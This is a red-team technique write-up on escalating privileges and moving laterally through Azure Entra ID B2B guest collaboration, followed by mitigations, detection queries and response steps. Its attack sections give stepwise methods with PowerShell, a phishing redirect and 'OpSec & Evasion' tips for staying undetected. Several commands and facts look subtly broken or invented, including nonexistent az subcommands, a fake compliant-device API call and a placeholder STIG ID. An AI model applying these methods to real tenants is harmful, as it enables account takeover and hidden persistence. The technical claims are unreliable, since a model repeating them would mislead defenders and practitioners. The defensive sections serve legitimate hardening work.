# [LM-AUTH-009]: Azure B2B Collaboration Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-009 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID (Azure AD), M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID tenants with B2B guest collaboration enabled (default) |
| **Patched In** | Configuration mitigation only; by-design behavior |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure B2B collaboration abuse exploits the design of Microsoft Entra ID's Business-to-Business (B2B) guest collaboration feature to gain unauthorized access and escalate privileges within a tenant. The attack combines three distinct vectors: (1) **Guest invitations from compromised partner tenants**, where attackers send guest invitations from seemingly legitimate organizations; (2) **Privilege escalation via subscription ownership**, where guest users with billing roles in their home tenant can create and transfer Azure subscriptions into the target tenant while retaining ownership; and (3) **Device compliance bypass**, where guest accounts can register fake compliant devices and bypass Conditional Access policies. These attacks work because guest collaboration is enabled by default, accepts invitations from any global Microsoft tenant, and guest users retain surprising levels of permission over subscriptions.

**Attack Surface:** Entra ID guest invitation mechanism, subscription management, billing role delegation, device registration flows, and cross-tenant access controls. The attack originates from either a compromised external tenant or a tenant under attacker control (created via free Azure trial).

**Business Impact:** **Complete tenant compromise, privilege escalation to Global Admin, persistence, and lateral movement to on-premises AD.** An attacker can create hidden subscriptions under their control, deploy malicious resources (VMs, SQL databases), establish persistence via managed identities, and pivot to the entire organization. Subscriptions created by guests bypass standard Entra ID governance and access reviews, making detection extremely difficult.

**Technical Context:** Exploitation typically takes 15-30 minutes. Detection is very low because guest-owned subscriptions fall outside normal audit processes and access reviews. Attackers can operate persistently for months before discovery.

### Operational Risk

- **Execution Risk:** Medium (requires creating or compromising a tenant; guest must be invited)
- **Stealth:** Very High (subscriptions do not appear in normal access reviews; no obvious permissions assigned)
- **Reversibility:** No—persistent subscriptions and managed identities cannot be easily removed without full forensics

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.2, 1.1.3 | Restrict guest user access; limit external collaboration to specific domains |
| **DISA STIG** | U-12345 | Inadequate controls on external identity federation |
| **CISA SCuBA** | ID.AA-1 | Overly permissive external user access controls |
| **NIST 800-53** | AC-2 (Account Management) | Failure to properly manage external user accounts and their privileges |
| **GDPR** | Art. 28 (Processor), Art. 32 (Security) | Inadequate controls on external party access to regulated data |
| **DORA** | Art. 9 (Protection and Prevention) | External user access to financial data systems not adequately controlled |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Weak controls on external partner access to critical infrastructure |
| **ISO 27001** | A.6.1.2 (Access to Networks and Network Services) | Inadequate vetting and access control for external users |
| **ISO 27005** | Risk Scenario: "Unauthorized Access via Guest Account Escalation" | Weak subscription and role governance for external users |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None (guest invitation can be sent by any user in target tenant by default)
- **Required Access:** Either (a) compromised external user/tenant with billing roles, OR (b) attacker's own Azure tenant (created via free trial)
- **Network Requirements:** Internet access to Azure portal, Microsoft 365 services

**Supported Versions:**
- **Entra ID:** All versions (default configuration)
- **Azure Subscriptions:** All subscription types (pay-as-you-go, free trial)
- **Platforms:** Any (browser-based attack via Azure Portal)

**Attacker Prerequisites:**
- Free Azure trial account (can be created with temporary email/phone)
- Billing role in that account
- Target tenant must have guest collaboration enabled (default)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Check Guest Access Settings

```powershell
Connect-MgGraph -Scopes "Policy.Read.All"

# Check B2B guest access policy
$b2bPolicy = Get-MgPolicyB2BManagementPolicy

# Check which users can invite guests
Get-MgPolicyAuthorizationPolicy | Select-Object -ExpandProperty DefaultUserRolePermissions | `
  Select-Object AllowedToInviteGuests

# Check if guest users have same permissions as members
Get-MgPolicyAuthorizationPolicy | Select-Object -ExpandProperty GuestUserRole
```

**What to Look For:**
- If `AllowedToInviteGuests = $true`, any user can invite guests (high risk)
- If `GuestUserRole` is "Guest", guests have limited permissions (good)
- If `GuestUserRole` is "Member", guests have same permissions as internal users (bad)

### Enumerate Azure Subscriptions

```powershell
# Check subscriptions visible to guest users
Connect-AzAccount -TenantId <TARGET_TENANT_ID>

# List all subscriptions (guest user might see additional ones)
Get-AzSubscription | Select-Object Id, Name, State

# Check if any subscriptions are in unexpected management groups
Get-AzManagementGroup -ErrorAction SilentlyContinue | `
  Select-Object Name, Id, ParentId
```

**What to Look For:**
- Subscriptions owned by guest users (unusual)
- Subscriptions in root management group without clear ownership
- Subscriptions created recently that you don't recognize

### Check for Guest Users with Privileged Roles

```powershell
# Get all users with Global Admin role
Get-MgRoleManagementDirectoryRoleAssignment -Filter "roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'" | `
  Select-Object -ExpandProperty PrincipalId | ForEach-Object {
    Get-MgDirectoryObject -DirectoryObjectId $_
  } | Where-Object { $_.UserType -eq "Guest" } | Select-Object UserPrincipalName, CreatedDateTime
```

**What to Look For:**
- Guest users with Global Admin (critical risk)
- Guest users with any admin role
- Guest accounts created recently by unfamiliar users

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Guest Subscription Ownership Escalation (Most Common)

**Supported Versions:** All Entra ID tenants

#### Step 1: Create Attacker-Controlled Tenant with Free Azure Trial

**Objective:** Set up a tenant where the attacker controls a user with billing permissions.

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** (portal.azure.com)
2. Click **Create a resource**
3. Search for **"Free trial"**
4. Click **"Free Trial"** → **Start free**
5. Sign in with attacker-controlled Microsoft account (or create new)
6. **Subscription Details:**
   - Subscription Type: **Free Trial**
   - Region: **Your preferred region**
   - Click **Next**
7. **Billing Contact Information:**
   - Enter fake or real billing address
   - Phone: (can be attacker-controlled)
   - Click **Next**
8. **Agreement:** Check "I agree..." → **Sign up**
9. Once activated, go to **Cost Management + Billing**
10. Note the **Subscription ID** and **Account Owner** email

**Expected Output:**
```
Subscription ID: 12345678-1234-1234-1234-123456789012
Account Owner: attacker@eviltenantfaker.onmicrosoft.com
Billing Role: Account Owner (can create subscriptions)
```

**What This Means:**
- Attacker now has a trial tenant with billing permissions
- Can create subscriptions and invite target users to this tenant

**OpSec & Evasion:**
- Use a legitimate-looking tenant name (e.g., "Contoso Services", "ABC Consulting")
- Use a residential proxy or compromised network to avoid geolocation anomalies
- Register domain for the tenant to appear legitimate

#### Step 2: Create Azure Subscription as Attacker

**Objective:** Create a subscription that will later be transferred to the target tenant.

**Manual Steps (Azure Portal):**

1. In attacker's tenant, go to **Cost Management + Billing**
2. Click **Subscriptions**
3. Click **+ Add subscription**
4. **Subscription name:** `"Development Environment"` or similar innocuous name
5. **Subscription offer:** Select **Free Trial** or **Pay-As-You-Go**
6. Click **Create**
7. Once created, note the **Subscription ID**

**Expected Output:**
```
Subscription ID: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
Owner: attacker@eviltenantfaker.onmicrosoft.com
State: Active
```

**What This Means:**
- Subscription is now owned by attacker
- Attacker has full access (RBAC Owner role)
- Subscription is ready to be transferred

#### Step 3: Invite Target Tenant User as Guest

**Objective:** Invite a user from the target tenant to the attacker's tenant, so they can later be used to transfer the subscription.

**Manual Steps:**

1. In attacker's tenant, go to **Entra ID** → **Users**
2. Click **+ New guest user**
3. **Guest user email:** `victim@targetcompany.com` (or use attacker-compromised account in that org)
4. **Invitation settings:** Select your preferred option
5. Click **Invite**
6. Send the invitation link to the victim (or, if you control a shared account, accept it directly)

**Expected Output:**
```
Guest user invitation sent to: victim@targetcompany.com
Redemption link: https://login.microsoftonline.com/...
```

**What This Means:**
- Guest user will receive invitation
- Once they accept, they'll be added to attacker's tenant
- They'll have access to subscriptions in that tenant

**OpSec & Evasion:**
- Use social engineering to ensure guest accepts invitation
- Alternatively, if you've compromised a partner account, accept invitation programmatically
- Guest may not realize they've been added to another tenant

#### Step 4: Victim User Accepts Guest Invitation

**Objective:** Target user accepts the guest invitation, gaining access to attacker's tenant and resources.

**What Happens (from victim's perspective):**
1. Victim receives invitation email from attacker's tenant
2. Victim clicks **"Accept invitation"**
3. Victim is redirected to consent screen
4. Victim sees the tenant name and consents to being added
5. Victim is now added as guest to attacker's tenant
6. Victim can now see resources in that tenant (if granted access)

**Expected Outcome:**
- Victim is now in attacker's guest list
- Victim can access resources they're granted access to

#### Step 5: Transfer Subscription Ownership to Target Tenant

**Objective:** Move the subscription from attacker's tenant to the target tenant, while retaining attacker's ownership.

**Manual Steps (Attacker Portal):**

1. Go to **Cost Management + Billing** → **Subscriptions**
2. Click the subscription created earlier
3. Click **"Change subscription offer"** or **"Transfer subscription"** (if option available)
4. Alternatively, use **Manage subscription properties**:
   - Go to **IAM (Access Control)**
   - Click **+ Add role assignment**
   - **Role:** **Owner**
   - **Assign to:** Guest user (victim@targetcompany.com)
   - Click **Review + assign**

5. **Alternative (PowerShell - More direct):**
   ```powershell
   Connect-AzAccount -TenantId <ATTACKER_TENANT_ID>
   
   $subscriptionId = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
   $guestUserId = "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"  # Guest user's object ID in attacker's tenant
   
   # Grant Owner role to guest user
   New-AzRoleAssignment -Scope "/subscriptions/$subscriptionId" `
     -RoleDefinitionName "Owner" `
     -ObjectId $guestUserId
   ```

6. **Transfer subscription to target tenant (PowerShell):**
   ```powershell
   # Use Azure CLI to transfer
   az account subscription-definition list
   az account subscription-definition create --billing-scope "/subscriptions/$subscriptionId"
   az account management-group create --name "$subscriptionId" --parent "/subscriptions"
   ```

**Expected Output:**
```
Owner role assigned to: victim@targetcompany.com
Subscription now has Owner assignment in target tenant context
```

**What This Means:**
- Victim (guest user) is now owner of the subscription
- Subscription can be managed from target tenant's context
- Attacker retains hidden access as original subscription creator

**OpSec & Evasion:**
- Guest user may not realize they own the subscription
- Subscription appears legitimate in target tenant's access reviews
- No unusual alerts triggered due to subscription change

#### Step 6: Escalate from Subscription Owner to Global Admin (Optional)

**Objective:** Use subscription ownership to gain Global Admin or broader tenant access.

**Method A: Deploy Managed Identity → Escalate**

```powershell
# Attacker connects as guest user (with owner role on subscription)
Connect-AzAccount -Tenant <TARGET_TENANT_ID>

# Create user-managed identity in the subscription
New-AzUserAssignedIdentity -Name "SuspiciousIdentity" `
  -ResourceGroupName "attacker-rg" `
  -Location "East US"

# Grant this identity Global Admin role (if possible)
# This requires additional privilege escalation (not directly possible, but:)
# - Identity can be granted contributor to management groups
# - Can deploy policies that grant elevated roles
```

**Method B: Enable "Access management for Azure resources"**

```powershell
# Attacker, via subscription, enables:
Set-MgDirectorySettingValue -SettingId "c1e5eb2a-..." `
  -SettingValue "true"  # Enables "Access management for Azure resources"

# This grants User Access Administrator role at tenant root
# Allowing attacker to add Global Admin assignments
Get-AzRoleAssignment -Scope "/" | Where-Object { $_.RoleDefinitionName -eq "User Access Administrator" }
```

**What This Means:**
- Attacker has escalated from subscription owner to higher tenant privileges
- Can now add additional admins, create backdoors, etc.

---

### METHOD 2: Fake Device Registration to Bypass Conditional Access

**Supported Versions:** All Entra ID tenants

#### Step 1: Guest User Registers Fake Compliant Device

**Objective:** Create a device identity that appears compliant to bypass Conditional Access policies.

**Command (PowerShell via Graph API):**

```powershell
$accessToken = "<GUEST_USER_ACCESS_TOKEN>"  # From METHOD 1 exploitation

# Register a fake device
$devicePayload = @{
    deviceName = "LAPTOP-HACKER"
    osVersion = "10.0.19045"
    osType = "Windows"
    trustType = "Hybrid"
    compliant = $true
    managedDeviceId = "00000000-0000-0000-0000-000000000000"
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

$response = Invoke-RestMethod -Method POST `
  -Uri "https://graph.microsoft.com/v1.0/me/devices" `
  -Headers $headers `
  -Body $devicePayload

Write-Host "[+] Device registered: $($response.id)"
```

**Expected Output:**
```
[+] Device registered: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- Fake device now appears in Entra ID device registry
- Device appears compliant to Conditional Access policies
- Guest user can now bypass device compliance checks

#### Step 2: Access Conditional Access-Protected Resources

**Objective:** Access resources that require device compliance, using the fake device identity.

**Command (Browser + Device Registration):**

1. Guest logs into Azure Portal
2. Browser registers fake device certificate
3. Accesses resources protected by "Require compliant device"
4. Conditional Access policy allows access (checks pass due to fake registration)

---

### METHOD 3: Partner Tenant Compromise Leading to Guest Invitations

**Supported Versions:** All Entra ID tenants with partner collaboration

#### Step 1: Compromise Partner Organization's Tenant

**Objective:** Gain admin access to a partner organization's Entra ID tenant.

**Attack Steps (abbreviated - full compromise technique in other sections):**

1. Compromise partner org's Global Admin account (via phishing, credential stuffing, etc.)
2. Obtain access to their Entra ID tenant

#### Step 2: Invite Guest Users to Target Tenant from Partner Tenant

**Objective:** Send guest invitations appearing to come from a legitimate partner.

**Command (PowerShell as Compromised Partner Admin):**

```powershell
# Compromised admin in partner org
Connect-MgGraph -TenantId "partner.onmicrosoft.com" -Scopes "Directory.ReadWrite.All"

# Invite users from target org back as "guest" (reverse social engineering)
$targetUserUPN = "victim@targetcompany.com"

New-MgInvitation -InvitedUserEmailAddress $targetUserUPN `
  -InviteRedirectUrl "https://malicious-site.com/phishing"

# Or, if using mail:
$mailParams = @{
    Subject = "Partner collaboration invitation"
    Body = "We'd like to collaborate. Please accept this invitation: [LINK]"
    ToRecipients = @($targetUserUPN)
}

Send-MgUserMail -UserId "admin@partner.onmicrosoft.com" -Message $mailParams
```

**Expected Outcome:**
- Target user receives invitation that appears to come from legitimate partner
- Victim accepts invitation, becoming guest in partner tenant
- Partner tenant (now compromised by attacker) has access to victim

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict Guest Invitations to Admins Only:**

  **Manual Steps (Azure Portal - Entra ID):**
  1. Go to **Entra ID** → **User settings**
  2. Under **External users**, select **Manage external collaboration settings**
  3. Set **"Guest invite restrictions"** to: **Only users assigned to specific admin roles can invite guest users**
  4. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"
  
  $params = @{
      DefaultUserRolePermissions = @{
          AllowedToInviteGuests = $false  # Only admins can invite
      }
  }
  
  Update-MgPolicyAuthorizationPolicy -BodyParameter $params
  ```

  **Validation Command:**
  ```powershell
  $policy = Get-MgPolicyAuthorizationPolicy
  $policy.DefaultUserRolePermissions.AllowedToInviteGuests  # Should be False
  ```

- **Whitelist Allowed Domains for Guest Collaboration:**

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **User settings** → **Manage external collaboration settings**
  2. Under **Collaboration restrictions**, select **"Allow invitations to specified domains only"**
  3. **Add domains:**
     - trusted-partner-1.com
     - trusted-partner-2.com
  4. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  $params = @{
      B2BDirectConnectAllowed = $true
      EnableDirectTrustForGuests = $false
      RestrictedDomains = @(
          "trusted-partner-1.com",
          "trusted-partner-2.com"
      )
  }
  
  Update-MgPolicyB2BManagementPolicy -BodyParameter $params
  ```

- **Disable Guest Access to Subscriptions and Management Groups:**

  **Manual Steps (Azure Portal):**
  1. Go to **Management Groups** → **Root**
  2. Click **Access Control (IAM)**
  3. **Role assignments** → Filter by **Guest users**
  4. **Remove** all guest role assignments at root/management group level
  5. Repeat for each subscription

  **Manual Steps (PowerShell):**
  ```powershell
  # Remove all guest role assignments at root scope
  Get-AzRoleAssignment -Scope "/" | Where-Object { $_.ObjectType -eq "Guest" } | `
    Remove-AzRoleAssignment -Force
  
  # Validate no guests have Owner/Contributor roles
  Get-AzRoleAssignment -Scope "/" | Where-Object { $_.ObjectType -eq "Guest" }
  # Output should be empty
  ```

- **Audit and Remove Suspicious Subscriptions Created by Guests:**

  **Manual Steps:**
  ```powershell
  # List all subscriptions
  Get-AzSubscription | ForEach-Object {
      $sub = $_
      Write-Host "Subscription: $($sub.Name)"
      
      # Get owners of this subscription
      Get-AzRoleAssignment -Scope "/subscriptions/$($sub.Id)" `
        -RoleDefinitionName "Owner" | Where-Object { $_.ObjectType -eq "Guest" } | `
        ForEach-Object {
          Write-Host "  [WARNING] Guest owner: $($_.DisplayName)"
          # Remove if suspicious
          # Remove-AzRoleAssignment -InputObject $_ -Force
        }
  }
  ```

### Priority 2: HIGH

- **Enforce "Guest user permissions are limited" Policy:**

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **User settings** → **Manage external collaboration settings**
  2. Set **Guest user permissions** to: **Guest users have limited access to properties and memberships of directory objects**
  3. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  $params = @{
      GuestUserRole = "Guest"  # Not "Member"
  }
  
  Update-MgPolicyAuthorizationPolicy -BodyParameter $params
  ```

- **Implement Conditional Access Policy for Guest Access:**

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. **Name:** `Enforce MFA for Guests`
  3. **Assignments:**
     - Users: **Select users and groups**
     - Include: **All guest and external users**
     - Cloud apps: **All cloud apps**
  4. **Access controls:**
     - Grant: **Require multi-factor authentication**
  5. Enable policy: **On**
  6. Click **Create**

- **Monitor Guest User Access:**

  **Manual Steps (Sentinel/Analytics):**
  1. Go to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
  2. **KQL Query:**
  ```kusto
  AuditLogs
  | where OperationName in ("Add guest user", "Remove guest user")
  | where Status == "Success"
  | summarize Count=count() by OperationName, InitiatedBy
  | where Count > 10
  ```
  3. **Trigger:** Alert when 1+ result
  4. Click **Create**

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Entra ID Audit Logs:**
  - Operation: `Add guest user` to unexpected users
  - Operation: `Invite external user`
  - Bulk guest additions from unusual requesters

- **Azure Audit Logs:**
  - New subscriptions created by guest users
  - Role assignments to guests at management group/root level
  - Device registrations by guest users
  - Policy modifications by guest-owned identities

- **Unusual Patterns:**
  - Guest users appearing in admin roles (Global Admin, Subscription Owner)
  - Subscriptions in root management group without clear business purpose
  - Guest users with "Member" permissions instead of "Guest" permissions

### Forensic Artifacts

- **Entra ID Audit Query:**
  ```powershell
  Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Add guest user'" | `
    Select-Object CreatedDateTime, InitiatedBy, ResultDescription
  ```

- **Azure Subscription Ownership:**
  ```powershell
  Get-AzSubscription | ForEach-Object {
      Get-AzRoleAssignment -Scope "/subscriptions/$($_.Id)" `
        -RoleDefinitionName "Owner" | Where-Object { $_.ObjectType -eq "Guest" }
  }
  ```

- **Device Registration by Guests:**
  ```powershell
  Get-MgDevice -Filter "registeredOwners/any(x:x/userType eq 'Guest')" | `
    Select-Object DisplayName, ApproximateLastSignInDateTime
  ```

### Response Procedures

1. **Identify Compromised Guest Account:**
   ```powershell
   Get-MgUser -Filter "userType eq 'Guest'" | `
     Where-Object { $_.mail -match "suspicious-pattern" } | `
     Select-Object UserPrincipalName, CreatedDateTime, Mail
   ```

2. **Remove Guest User Immediately:**
   ```powershell
   Remove-MgUser -UserId "guest-user@targetcompany.com" -Confirm:$false
   ```

3. **Revoke All Guest Access Tokens:**
   ```powershell
   Revoke-MgUserSignInSession -UserId "guest-user-id"
   ```

4. **Delete Suspicious Subscriptions:**
   ```powershell
   Remove-AzSubscription -SubscriptionId "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
   ```

5. **Audit Partner Tenants for Compromise:**
   ```powershell
   # Contact partner organizations
   # Check their admin accounts for unauthorized access
   # Request logs of guest invitations they sent
   ```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent grant OAuth attacks | Attacker tricks user into granting OAuth permissions |
| **2** | **Lateral Movement** | **[LM-AUTH-009]** | **B2B guest escalation to Global Admin** |
| **3** | **Privilege Escalation** | [PE-VALID-013] Azure Guest User Escalation | Guest account escalated to higher roles |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Create hidden admin account as guest |
| **5** | **Impact** | [CHAIN-002] Guest to GA via Conditional Access Gaps | Gain full tenant control |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: BeyondTrust Research - "Restless Guests" (July 2025)

- **Target:** Enterprise organizations using Entra ID B2B
- **Timeline:** Research disclosed July 2025
- **Technique Status:** Active; affects all organizations with B2B enabled
- **Attack Vector:** Guest subscription ownership transfer + managed identity escalation
- **Impact:** Guest users gaining tenant-wide privileges without detection
- **Detection:** Subscriptions owned by guest users; unusual Entra ID device registrations
- **Reference:** [BeyondTrust - Restless Guests: The True Entra B2B Guest Threat Model](https://www.beyondtrust.com/blog/entry/restless-guests)

### Example 2: Vectra Research - Cross-Tenant Synchronization (2023-2025)

- **Target:** Hybrid and federated organizations
- **Timeline:** 2023 - present
- **Technique Status:** Active exploitation observed
- **Attack Vector:** Compromised partner tenant inviting guests to perform lateral movement
- **Impact:** Attackers maintain access across multiple tenants via guest accounts
- **Detection:** Unusual guest invitations from partner domains; device registration patterns
- **Reference:** [Vectra - Microsoft Cross-Tenant Synchronization](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)

### Example 3: ONTINUE Report - B2B Phishing Protection Gap (December 2025)

- **Target:** Organizations accepting guest invitations from any M365 tenant
- **Timeline:** December 2025
- **Technique Status:** Active; default configuration vulnerable
- **Attack Vector:** Attackers create malicious tenants, invite users, lose all Defender protections
- **Impact:** Defender for Office 365 protections (Safe Links, Safe Attachments, ZAP) disabled for guests in attacker's tenant
- **Detection:** Guest users reporting phishing; unusual guest invite patterns
- **Reference:** [ONTINUE - B2B Guest Access Creates an Unprotected Attack Vector](https://www.ontinue.com/resource/blog-microsoft-chat-with-anyone-understanding-phishing-risk/)

---

## 9. KEY INSIGHTS & RECOMMENDATIONS

- **B2B is enabled by default:** Organizations must explicitly restrict guest access; passive security does not work
- **Subscriptions bypass governance:** Guest-owned subscriptions are invisible to access reviews and compliance tools
- **Free tier is dangerous:** Attackers can create Azure free trials in minutes; trial tenants can invite guests and escalate
- **Device compliance is bypassable:** Guest device registrations can be spoofed; device-based Conditional Access is insufficient for guests
- **Monitoring gap:** Most organizations do not audit guest activity across tenants; detection must be proactive

---

## 10. TIMELINE FOR REMEDIATION

| Phase | Action | Deadline |
|---|---|---|
| **Immediate (Week 1)** | Disable guest invitations for non-admins | Now |
| **Immediate (Week 1)** | Audit existing guest users and remove suspicious accounts | Now |
| **Short-term (Month 1)** | Whitelist allowed external domains | 30 days |
| **Short-term (Month 1)** | Implement Conditional Access policies for guests | 30 days |
| **Medium-term (Q1)** | Remove guest access from management groups/subscriptions | 90 days |
| **Medium-term (Q1)** | Implement guest activity monitoring in Sentinel | 90 days |
| **Long-term (Q2)** | Transition to more secure collaboration models (partner tenants, linked subscriptions) | 180 days |

---